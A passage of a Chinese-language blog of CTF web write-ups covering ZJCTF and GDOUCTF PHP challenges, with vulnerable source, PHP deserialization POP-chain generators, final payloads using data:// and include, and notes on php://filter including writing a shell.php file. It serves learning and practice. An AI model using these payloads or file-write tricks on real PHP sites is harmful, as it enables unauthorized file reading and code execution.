class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;password&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;welcome to the zjctf&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not now!&quot;</span>;<br>        <span class="hljs-keyword">exit</span>(); <br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//useless.php</span><br>        <span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$password</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$password</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;  <span class="hljs-comment">//flag.php  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;  <br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;file))&#123;  <br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;file); <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);<br>        &#125;  <br>    &#125;  <br>&#125;  <br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>;<br><span class="hljs-variable">$a</span>-&gt;file=flag.php;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>最后poc出了password的payload，  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:7:&quot;flagphp&quot;;&#125;<br></code></pre></td></tr></table></figure><p>但是传进去后只回显了个  </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> zjctf<br><br><br>oh u find <span class="hljs-keyword">it</span><br><br>U R SO CLOSE <span class="hljs-comment">!///COME ON PLZ</span><br></code></pre></td></tr></table></figure><p>最后去看别人的wp才知道flag就包含在这个页面下，按f12就能看到了😅<br>最终payload</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">?<span class="hljs-type">text</span>=data://<span class="hljs-type">text</span>/plain,welcome<span class="hljs-meta">%20to</span><span class="hljs-meta">%20the</span><span class="hljs-meta">%20zjctf</span>&amp;file=useless.php&amp;password=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Flag&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题我就只会最后构造反序列化的poc了<br>但也是学到了php伪协议的东西</p><h2 id="notice01"><a href="#notice01" class="headerlink" title="notice01"></a>notice01</h2><h2 id="KIMI-逐部分解析"><a href="#KIMI-逐部分解析" class="headerlink" title="KIMI:逐部分解析"></a>KIMI:逐部分解析</h2><p>include:<br>include 是 PHP 中的一个语句，用于动态包含另一个文件的内容到当前脚本中。<br>如果被包含的文件中包含 PHP 代码，这些代码会被执行。<br>php:&#x2F;&#x2F;filter:<br>php:&#x2F;&#x2F;filter 是一个伪协议，允许开发者在读取或写入数据时应用过滤器。它可以在数据流打开时对数据进行处理。<br>convert.base64-encode:<br>这是一个过滤器，表示对数据进行 Base64 编码。Base64 编码是一种将二进制数据转换为 ASCII 字符串的方法，常用于在需要以文本形式传输二进制数据的场景。<br>resource&#x3D;useless.php:<br>resource 参数指定了要处理的文件路径，这里是 useless.php。这意味着过滤器将应用于 useless.php 文件的内容。</p><hr><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter "></a>php:&#x2F;&#x2F;filter </h2><p>是 PHP 中一种独特的伪协议，它允许开发者在数据读取或写入过程中应用过滤器，从而实现对数据的处理。它是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，例如 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</p><p>php:&#x2F;&#x2F;filter 协议的一般语法为：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/&lt;action&gt;/resource=&lt;待过滤的数据流&gt;</span><br><br><span class="hljs-comment">//其中 &lt;action&gt; 表示要对数据执行的过滤操作，如读取（read）、转换编码（convert）或字符串操作（string）等；  </span><br><span class="hljs-comment">//&lt;待过滤的数据流&gt; 通常是要读取或写入的文件路径或 URL。</span><br><span class="hljs-comment">//过滤器可以设置多个，按照链式的方式依次对数据进行过滤处理</span><br></code></pre></td></tr></table></figure><p>过滤器分类<br>字符串过滤器：以 string 开头，对数据进行字符串处理，如 rot13、toupper、tolower、strip_tags 等。<br>转换过滤器：以 convert 开头，对数据进行编码转换，如 Base64 编码、解码，Quoted-Printable 编码、解码，iconv 字符编码转换等。<br>压缩过滤器：如 zlib.deflate（压缩）、zlib.inflate（解压）、bzip2.compress（压缩）、bzip2.decompress（解压）等。<br>加密过滤器：如 mcrypt.* 和 mdecrypt.*，用于数据的加密和解密。不过，这个特性已自 PHP 7.1.0 起废弃，强烈建议不要使用。</p><p>示例<br>读取文件并进行 Base64 编码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=index.php&quot;</span>);<br>这行代码会读取 index.php 文件的内容，并将其进行 Base64 编码后输出。<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;</span>, <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>));<br>这行代码会将 Base64 编码的字符串写入 shell.php 文件，<br>并在写入前进行 Base64 解码，最终 shell.php 文件中将包含原始的 <span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span> 代码。<br></code></pre></td></tr></table></figure><hr><h2 id="title-note-18date-2025-03-26-21-35-34tags-unserialize"><a href="#title-note-18date-2025-03-26-21-35-34tags-unserialize" class="headerlink" title="title: note-18date: 2025-03-26 21:35:34tags: unserialize"></a>title: note-18<br>date: 2025-03-26 21:35:34<br>tags: unserialize</h2><h1 id="GDOUCTF-反方向的钟"><a href="#GDOUCTF-反方向的钟" class="headerlink" title="GDOUCTF_反方向的钟"></a>GDOUCTF_反方向的钟</h1><p>开篇源码，但是看不懂</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;d&#x27;</span>]));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看大佬wp<br><a href="https://blog.csdn.net/weixin_73668856/article/details/134878471">https://blog.csdn.net/weixin_73668856/article/details/134878471</a></p><blockquote><p>先看看利用点：</p></blockquote><blockquote><p>应该是$_POST<a href="$_POST%5B'b'%5D">‘a’</a>;</p></blockquote><blockquote><p>尝试构造链子school::IPO() -&gt; school::__wakeup -&gt;classroom::hahaha-&gt;teacher</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;ing&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>=<span class="hljs-string">&#x27;department&#x27;</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>=<span class="hljs-string">&#x27;one class&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>&#125;<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>=<span class="hljs-string">&#x27;ong&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>();<br><span class="hljs-variable">$a</span>-&gt;department=<span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;leader=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br> <br>结果：                      <br>Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjoyOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO319czoxMDoiaGVhZG1hc3RlciI7czozOiJvbmciO30=<br></code></pre></td></tr></table></figure><p>不知道为啥我在原码后面直接构造死活输出不了  </p><p>又试了一次，学到对了一种新的构造语法  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">teacher</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$rank</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$salary</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$rank</span>,<span class="hljs-variable">$salary</span> = <span class="hljs-number">10000</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;rank = <span class="hljs-variable">$rank</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;salary = <span class="hljs-variable">$salary</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">classroom</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$leader</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$leader</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;leader = <span class="hljs-variable">$leader</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hahaha</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name != <span class="hljs-string">&#x27;one class&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;name != <span class="hljs-string">&#x27;ing&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-variable language_">$this</span>-&gt;leader-&gt;rank !=<span class="hljs-string">&#x27;department&#x27;</span>)&#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> True;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">school</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$department</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$headmaster</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$department</span>,<span class="hljs-variable">$ceo</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;department = <span class="hljs-variable">$department</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;headmaster = <span class="hljs-variable">$ceo</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakea</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">school</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">classroom</span>(<span class="hljs-string">&#x27;one class&#x27;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">teacher</span>(<span class="hljs-string">&#x27;ing&#x27;</span>,<span class="hljs-string">&#x27;department&#x27;</span>)),<span class="hljs-string">&#x27;ong&#x27;</span>);<br><br><span class="hljs-comment">// $a=new school();</span><br><span class="hljs-comment">// $b=new classroom();</span><br><span class="hljs-comment">// $c=new teacher();</span><br><span class="hljs-comment">// $a-&gt;department=$b;</span><br><span class="hljs-comment">// $b-&gt;leader=$c;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>用得到的payload传get的’d’</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">d</span>=Tzo2OiJzY2hvb2wiOjI6e3M6MTA6ImRlcGFydG1lbnQiO086OToiY2xhc3Nyb29tIjoyOntzOjQ6Im5hbWUiO3M6OToib25lIGNsYXNzIjtzOjY6ImxlYWRlciI7Tzo3OiJ0ZWFjaGVyIjozOntzOjQ6Im5hbWUiO3M6MzoiaW5nIjtzOjQ6InJhbmsiO3M6MTA6ImRlcGFydG1lbnQiO3M6MTU6IgB0ZWFjaGVyAHNhbGFyeSI7aToxMDAwMDt9fXM6MTA6ImhlYWRtYXN0ZXIiO3M6Mzoib25nIjt9<br></code></pre></td></tr></table></figure><p>此时由于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;department-&gt;<span class="hljs-title function_ invoke__">hahaha</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">IPO</span>();<br>        &#125;<br>    &#125;<br><br><span class="hljs-comment">//会唤醒</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">IPO</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;headmaster == <span class="hljs-string">&#x27;ong&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Pretty Good ! Ctfer!\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>此时传入的post a和b就会拼接进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>](<span class="hljs-variable">$_POST</span>[<span 